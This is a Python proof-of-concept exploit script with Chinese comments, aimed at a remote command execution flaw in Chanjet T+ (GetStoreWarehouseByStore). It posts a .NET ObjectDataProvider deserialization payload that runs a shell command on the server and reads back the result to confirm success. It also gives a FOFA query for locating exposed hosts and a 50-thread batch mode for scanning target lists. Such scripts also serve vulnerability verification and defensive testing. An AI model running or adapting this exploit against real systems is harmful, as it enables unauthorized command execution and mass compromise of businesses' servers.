# 用友畅捷通T+GetStoreWarehouseByStore RCE漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app="畅捷通-TPlus"

def banner():
    test = """
██╗   ██╗██╗   ██╗ ██████╗████████╗  ██╗      ██████╗  ██████╗███████╗
╚██╗ ██╔╝╚██╗ ██╔╝██╔════╝╚══██╔══╝  ██║      ██╔══██╗██╔════╝██╔════╝
 ╚████╔╝  ╚████╔╝ ██║        ██║     ██║█████╗██████╔╝██║     █████╗  
  ╚██╔╝    ╚██╔╝  ██║        ██║██   ██║╚════╝██╔══██╗██║     ██╔══╝  
   ██║      ██║   ╚██████╗   ██║╚█████╔╝      ██║  ██║╚██████╗███████╗
   ╚═╝      ╚═╝    ╚═════╝   ╚═╝ ╚════╝       ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                      
                                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='用友畅捷通T+GetStoreWarehouseByStore RCE漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "X-Ajaxpro-Method": "GetStoreWarehouseByStore",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Connection": "close",
        "Content-type": "application/x-www-form-urlencoded"
    }
    data = {
        "storeID": {
            "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName": "Start",
            "ObjectInstance": {
                "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "StartInfo": {
                    "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                    "FileName": "cmd", 
                    "Arguments": "/c whoami > test.txt"
                }
            }
        }
    }
    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        if response.status_code == 200 and 'error' in response.text:
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                }
            path = '/tplus/test.txt'
            response1 = requests.get(url=target+path,headers=header,verify=False,timeout=10)
            if response1.status_code == 200 and '404' not in response1.text and '错误信息' not in response1.text and "登录" not in response1.text:
                print(f"[+]{target} 存在命令执行漏洞")
                with open('result.txt','a') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target} 不存在命令执行漏洞")
        else:
            print(f"[-]{target} 不存在命令执行漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()